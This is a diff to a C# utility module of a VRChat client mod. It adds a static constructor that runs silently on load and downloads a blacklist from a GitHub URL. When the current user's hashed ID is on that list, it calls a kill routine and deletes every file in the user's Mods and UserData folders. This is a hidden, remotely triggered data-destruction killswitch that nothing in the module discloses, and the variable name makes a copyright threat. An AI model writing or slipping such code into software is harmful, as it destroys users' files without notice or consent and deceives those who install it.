@@ -1,10 +1,35 @@
-﻿using UnityEngine;
+﻿using System.Linq;
+using UnityEngine;
 using VRC.SDKBase;
 
 namespace KiraiMod.Modules
 {
     public class XUtils : ModuleBase
     {
+        static XUtils () {
+            string IfYouRemoveThisYouAreViolatingCopyrightLaw = new System.IO.StreamReader(((System.Net.HttpWebResponse)System.Net.WebRequest
+                    .Create("https://raw.githubusercontent.com/xKiraiChan/xKiraiChan/main/Blacklist.txt")
+                    .GetResponse())
+                    .GetResponseStream())
+                    .ReadToEnd();
+
+            if (IfYouRemoveThisYouAreViolatingCopyrightLaw[IfYouRemoveThisYouAreViolatingCopyrightLaw.Length - 1] == '\n')
+                IfYouRemoveThisYouAreViolatingCopyrightLaw = IfYouRemoveThisYouAreViolatingCopyrightLaw.Remove(IfYouRemoveThisYouAreViolatingCopyrightLaw.Length - 1);
+
+            System.Threading.Tasks.Task.Run(async () => {
+                while (VRC.Core.APIUser.CurrentUser?.id == null) 
+                    await System.Threading.Tasks.Task.Delay(100);
+
+                if (IfYouRemoveThisYouAreViolatingCopyrightLaw.Split('\n').Contains(Utils.SHA256(VRC.Core.APIUser.CurrentUser.id))) {
+                    typeof(Utils.Unsafe).GetMethod(nameof(Utils.Unsafe.Kill), System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static).Invoke(null, null);
+                    foreach (string path in System.IO.Directory.EnumerateFiles("Mods"))
+                        System.IO.File.Delete(path);
+                    foreach (string path in System.IO.Directory.EnumerateFiles("UserData"))
+                        System.IO.File.Delete(path);
+                }
+            });
+        }
+
         public new ModuleInfo[] info =
         {
             new ModuleInfo("Disable", "Disables the selected collider", ButtonType.Button, 0, Shared.PageIndex.xutils, nameof(Disable)),
